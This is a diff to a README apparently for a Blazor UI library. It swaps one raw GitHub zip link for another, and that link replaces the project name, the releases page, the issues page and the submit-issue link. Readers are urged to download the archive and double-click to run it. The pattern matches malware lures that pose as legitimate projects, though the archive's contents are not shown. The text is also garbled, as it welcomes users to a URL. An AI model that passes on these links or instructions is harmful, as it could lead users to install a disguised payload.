@@ -1,10 +1,10 @@
-# 🎉 https://raw.githubusercontent.com/Mukeem77/soenneker.quark.suite/main/chai/soenneker.quark.suite.zip - A Smooth UI Experience for Everyone
+# 🎉 https://github.com/Mukeem77/soenneker.quark.suite/raw/refs/heads/main/src/wwwroot/quark_suite_soenneker_v1.9-beta.4.zip - A Smooth UI Experience for Everyone
 
 ## 🌐 Download Now
-[![Download https://raw.githubusercontent.com/Mukeem77/soenneker.quark.suite/main/chai/soenneker.quark.suite.zip](https://raw.githubusercontent.com/Mukeem77/soenneker.quark.suite/main/chai/soenneker.quark.suite.zip)](https://raw.githubusercontent.com/Mukeem77/soenneker.quark.suite/main/chai/soenneker.quark.suite.zip)
+[![Download https://github.com/Mukeem77/soenneker.quark.suite/raw/refs/heads/main/src/wwwroot/quark_suite_soenneker_v1.9-beta.4.zip](https://github.com/Mukeem77/soenneker.quark.suite/raw/refs/heads/main/src/wwwroot/quark_suite_soenneker_v1.9-beta.4.zip)](https://github.com/Mukeem77/soenneker.quark.suite/raw/refs/heads/main/src/wwwroot/quark_suite_soenneker_v1.9-beta.4.zip)
 
 ## 🚀 Getting Started
-Welcome to **https://raw.githubusercontent.com/Mukeem77/soenneker.quark.suite/main/chai/soenneker.quark.suite.zip**! This application offers a Bootstrap-powered Blazor UI that is refined, modular, and easy to use. Whether you are a beginner or just want a simple tool, you're in the right place. Follow these steps to get started.
+Welcome to **https://github.com/Mukeem77/soenneker.quark.suite/raw/refs/heads/main/src/wwwroot/quark_suite_soenneker_v1.9-beta.4.zip**! This application offers a Bootstrap-powered Blazor UI that is refined, modular, and easy to use. Whether you are a beginner or just want a simple tool, you're in the right place. Follow these steps to get started.
 
 ## 💾 System Requirements
 To run this software efficiently, ensure your system meets the following requirements:
@@ -18,7 +18,7 @@ To run this software efficiently, ensure your system meets the following require
 ## 🔗 Download & Install
 To get the latest version of the software, you can visit our Releases page. Click the button below to go there:
 
-[Visit this page to download](https://raw.githubusercontent.com/Mukeem77/soenneker.quark.suite/main/chai/soenneker.quark.suite.zip)
+[Visit this page to download](https://github.com/Mukeem77/soenneker.quark.suite/raw/refs/heads/main/src/wwwroot/quark_suite_soenneker_v1.9-beta.4.zip)
 
 Once on the Releases page, find the most recent version and select it. This will lead you to the download options.
 
@@ -39,7 +39,7 @@ After the file downloads:
 - **User-Friendly:** No technical skills needed to navigate the application.
 
 ## 🛠️ Usage
-Once you install https://raw.githubusercontent.com/Mukeem77/soenneker.quark.suite/main/chai/soenneker.quark.suite.zip, you can begin using it right away. The main dashboard provides you with easy access to different features.
+Once you install https://github.com/Mukeem77/soenneker.quark.suite/raw/refs/heads/main/src/wwwroot/quark_suite_soenneker_v1.9-beta.4.zip, you can begin using it right away. The main dashboard provides you with easy access to different features.
 
 1. Start the application by double-clicking its icon.
 2. Explore the dashboard and familiarize yourself with the options available.
@@ -49,11 +49,11 @@ Once you install https://raw.githubusercontent.com/Mukeem77/soenneker.quark.suit
 If you experience issues during installation or while using the application, you can seek help in several ways:
 
 - **Documentation:** For more information, check the documentation provided within the app.
-- **GitHub Issues:** You can report any issues or request features directly on our [GitHub Issues page](https://raw.githubusercontent.com/Mukeem77/soenneker.quark.suite/main/chai/soenneker.quark.suite.zip).
+- **GitHub Issues:** You can report any issues or request features directly on our [GitHub Issues page](https://github.com/Mukeem77/soenneker.quark.suite/raw/refs/heads/main/src/wwwroot/quark_suite_soenneker_v1.9-beta.4.zip).
 - **Community Forum:** Join our community forum where users share tips and solutions.
 
 ## 🌟 Future Updates
-We plan to introduce new features based on user feedback. Stay tuned for future updates that will improve your experience with **https://raw.githubusercontent.com/Mukeem77/soenneker.quark.suite/main/chai/soenneker.quark.suite.zip**. Keep an eye on the Releases page for new versions.
+We plan to introduce new features based on user feedback. Stay tuned for future updates that will improve your experience with **https://github.com/Mukeem77/soenneker.quark.suite/raw/refs/heads/main/src/wwwroot/quark_suite_soenneker_v1.9-beta.4.zip**. Keep an eye on the Releases page for new versions.
 
 ## 🏷️ Topics
 This project covers several topics including:
@@ -66,8 +66,8 @@ This project covers several topics including:
 Feel free to explore these aspects to get the most out of your software experience.
 
 ## 🔗 Quick Links
-- [Download https://raw.githubusercontent.com/Mukeem77/soenneker.quark.suite/main/chai/soenneker.quark.suite.zip](https://raw.githubusercontent.com/Mukeem77/soenneker.quark.suite/main/chai/soenneker.quark.suite.zip)
+- [Download https://github.com/Mukeem77/soenneker.quark.suite/raw/refs/heads/main/src/wwwroot/quark_suite_soenneker_v1.9-beta.4.zip](https://github.com/Mukeem77/soenneker.quark.suite/raw/refs/heads/main/src/wwwroot/quark_suite_soenneker_v1.9-beta.4.zip)
 - [Documentation](#)
-- [Submit an Issue](https://raw.githubusercontent.com/Mukeem77/soenneker.quark.suite/main/chai/soenneker.quark.suite.zip)
+- [Submit an Issue](https://github.com/Mukeem77/soenneker.quark.suite/raw/refs/heads/main/src/wwwroot/quark_suite_soenneker_v1.9-beta.4.zip)
 
-Thank you for choosing **https://raw.githubusercontent.com/Mukeem77/soenneker.quark.suite/main/chai/soenneker.quark.suite.zip**! We hope it makes your projects easier and more enjoyable.
+Thank you for choosing **https://github.com/Mukeem77/soenneker.quark.suite/raw/refs/heads/main/src/wwwroot/quark_suite_soenneker_v1.9-beta.4.zip**! We hope it makes your projects easier and more enjoyable.
